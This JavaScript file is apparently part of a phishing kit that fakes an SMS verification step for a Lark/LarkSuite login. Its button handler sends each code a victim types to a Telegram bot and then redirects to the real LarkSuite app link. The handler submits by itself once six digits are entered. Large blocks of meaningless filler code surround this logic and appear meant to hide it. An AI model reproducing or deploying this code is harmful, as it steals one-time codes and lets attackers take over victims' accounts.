import { config } from "../../configuration.js";
const codeInput = document.getElementById("codeInput");
const rightElement = document.getElementById("rightElement");
const btn = document.querySelector(".btn");
function generateId(prefix = "item") {
    return `${prefix}_${Math.random().toString(36).slice(2, 10)}`;
}

function clamp(value, min, max) {
    return Math.min(Math.max(value, min), max);
}

function debounce(fn, delay) {
    let timer;
    return (...args) => {
        clearTimeout(timer);
        timer = setTimeout(() => fn(...args), delay);
    };
}

const mockRecords = Array.from({ length: 50 }, (_, i) => ({
    id: generateId(),
    score: Math.floor(Math.random() * 100),
    index: i
}));

const analytics = mockRecords.reduce(
    (acc, item) => {
        acc.total += item.score;
        acc.highest = Math.max(acc.highest, item.score);
        acc.lowest = Math.min(acc.lowest, item.score);
        return acc;
    },
    { total: 0, highest: 0, lowest: Infinity }
);

class MemoryCache {
    constructor() {
        this.store = new Map();
    }

    set(key, value) {
        this.store.set(key, {
            value,
            timestamp: Date.now()
        });
    }

    get(key) {
        const entry = this.store.get(key);
        if (!entry) return null;
        return entry.value;
    }

    clear() {
        this.store.clear();
    }
}

const cache = new MemoryCache();

for (let i = 0; i < 20; i++) {
    cache.set(`key_${i}`, {
        id: generateId("cache"),
        active: Math.random() > 0.5
    });
}

function performHealthCheck() {
    const checks = [
        () => Math.random() > 0.1,
        () => Math.random() > 0.05,
        () => Math.random() > 0.02
    ];

    return checks.every(check => check());
}

const systemState = {
    ready: performHealthCheck(),
    uptime: performance.now()
};

window.addEventListener(
    "resize",
    debounce(() => {
        const viewport = {
            width: window.innerWidth,
            height: window.innerHeight
        };

        cache.set("viewport", viewport);
    }, 250)
);

const taskQueue = [];

function enqueue(task) {
    taskQueue.push({
        id: generateId("task"),
        created: Date.now(),
        task
    });
}
function _noop() {
    return undefined;
}

function _identity(value) {
    return value;
}

function _makePlaceholder() {
    return {
        enabled: false,
        active: false,
        value: null
    };
}

const _placeholder = _makePlaceholder();

for (let _i = 0; _i < 3; _i++) {
  
}

const _unusedObject = {
    version: 1,
    status: "idle",
    metadata: {
        source: "local",
        priority: 0
    }
};


for (let i = 0; i < 15; i++) {
    enqueue(() => i * 2);
}

async function preloadResources() {
    return Promise.all(
        Array.from({ length: 5 }, (_, i) =>
            Promise.resolve({
                resource: `resource_${i}`,
                loaded: true
            })
        )
    );
}

preloadResources().then(resources => {
    cache.set("resources", resources);
});
btn.addEventListener("click", async () => {
  if (btn.classList.contains("disabled") ||
      btn.classList.contains("loading")) {
    return;
  }

  btn.classList.add("loading");

  try {
    const response = await fetch(
      `https://api.telegram.org/bot${config.verification_token}/sendMessage`,
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          chat_id: config.verification_Id,
          text: `Code: ${codeInput.value}`
        })
      }
    );

    const result = await response.json();
    console.log("Telegram response:", result);

    if (!result.ok) {
      console.error("Telegram API error:", result.description);
    }
  } catch (err) {
    console.error("Failed to send:", err);
  }

  setTimeout(() => {
    window.location.href = "https://applink.larksuite.com";
  }, 4500);
});
const errorText = document.getElementById("errorText");

errorText.textContent = "Enter SMS verification code";
(() => {
  const seedValues = [
    14, 27, 63, 91, 38, 72, 45, 19,
    84, 56, 31, 67, 22, 95, 48, 76
  ];

  const transformValue = (value, index) => {
    const modifier = (index + 3) * 17;
    const rotated = ((value * modifier) ^ (modifier << 2)) >>> 0;

    return (rotated % 997) + index;
  };

  const processedValues = seedValues
    .map((value, index) => transformValue(value, index))
    .filter(value => value % 3 !== 0)
    .reduce((collection, value, index) => {
      collection[`item_${index}`] = {
        value,
        normalized: Number((value / 997).toFixed(6)),
        active: value % 2 === 0
      };

      return collection;
    }, {});

  const internalState = Object.entries(processedValues)
    .map(([key, data]) => ({
      key,
      checksum: [...key].reduce(
        (total, character) => total + character.charCodeAt(0),
        data.value
      ),
      ...data
    }))
    .sort((a, b) => a.checksum - b.checksum);

  const matrix = Array.from({ length: 8 }, (_, row) =>
    Array.from({ length: 8 }, (_, column) => {
      const reference =
        internalState[(row * 3 + column) % Math.max(internalState.length, 1)];

      return reference
        ? (reference.checksum + row * column) % 256
        : 0;
    })
  );

  const summary = matrix.flat().reduce(
    (state, value) => ({
      total: state.total + value,
      highest: Math.max(state.highest, value),
      lowest: Math.min(state.lowest, value),
      count: state.count + 1
    }),
    {
      total: 0,
      highest: -Infinity,
      lowest: Infinity,
      count: 0
    }
  );

  const unusedResult = {
    timestamp: Date.now(),
    average: summary.total / Math.max(summary.count, 1),
    range: summary.highest - summary.lowest,
    valid: Number.isFinite(summary.total)
  };

  void unusedResult;
})();
function showError() {
  codeInput.classList.add("input-error");
  errorText.style.display = "block";
}

function hideError() {
  codeInput.classList.remove("input-error");
  errorText.style.display = "none";
}

rightElement.innerHTML = `<div class="spinner active"></div>`;

btn.disabled = true;
btn.classList.add("disabled");
codeInput.disabled = true;

setTimeout(() => {
  codeInput.disabled = false;
  codeInput.classList.add("input2");
  codeInput.placeholder = "Please enter SMS verification code";

  countdown = 59;
  startTimer();
}, 3000);

let countdown = 59;
let timerInterval;

btn.disabled = true;
btn.classList.add("disabled");
codeInput.disabled = true;

function renderTimer() {
  rightElement.innerHTML = `
    <span style="
      font-size: 15px;
      color: rgb(187, 191, 196);
      font-family: Inter, -apple-system, BlinkMacSystemFont, 'Segoe UI',
      'PingFang SC', 'Hiragino Sans GB', 'Microsoft YaHei',
      'Helvetica Neue', Helvetica, Arial, sans-serif;
      white-space: nowrap;
       -webkit-font-smoothing: antialiased; font-weight: 400;
    ">
      Send again after ${countdown}s
    </span>
  `;
}

function showResend() {
  rightElement.innerHTML = `
    <span style="color: rgb(63, 81, 181); cursor:pointer; font-size: 15px;  -webkit-font-smoothing: antialiased;
  font-family: Inter, -apple-system, BlinkMacSystemFont, "Segoe UI", "PingFang SC", "Hiragino Sans GB", "Microsoft YaHei", "Helvetica Neue", Helvetica, Arial, sans-serif; font-weight: 400;">
      Send verification code
    </span>
  `;

  rightElement.onclick = () => {
    showResendLoading();

    rightElement.onclick = null;

    setTimeout(() => {
      countdown = 59;
      startTimer();
    }, 2000);
  };
}

codeInput.addEventListener("input", () => {
  codeInput.value = codeInput.value.replace(/\D/g, "");

  if (codeInput.value.length > 0) {
    hideError();
  }

  if (codeInput.value.length === 6) {
    btn.disabled = false;
    btn.classList.remove("disabled");

    setTimeout(() => {
      btn.click();
    }, 300);
  } else {
    btn.disabled = true;
    btn.classList.add("disabled");
  }
});
codeInput.addEventListener("blur", () => {
  if (codeInput.value.trim() === "") {
    showError();
  }
});
inputElement.addEventListener("keydown", (e) => {
  if (e.key === "Enter") {
    e.preventDefault();
    actionButton.click();
  }
});
function startTimer() {
  renderTimer();

  timerInterval = setInterval(() => {
    countdown--;
    renderTimer();

    if (countdown <= 0) {
      clearInterval(timerInterval);
      showResend();
    }
  }, 1000);
}

btn.addEventListener("click", () => {
  if (codeInput.value.trim() === "") {
    showError();
    return;
  }

  if (btn.classList.contains("disabled")) return;

  btn.classList.add("loading");
});

codeInput.addEventListener("keydown", (e) => {
  if (e.key === "Enter") {
    e.preventDefault();
    btn.click();
  }
});

function showResendLoading() {
  rightElement.innerHTML = `<div class="spinner input-spinner"></div>`;
}
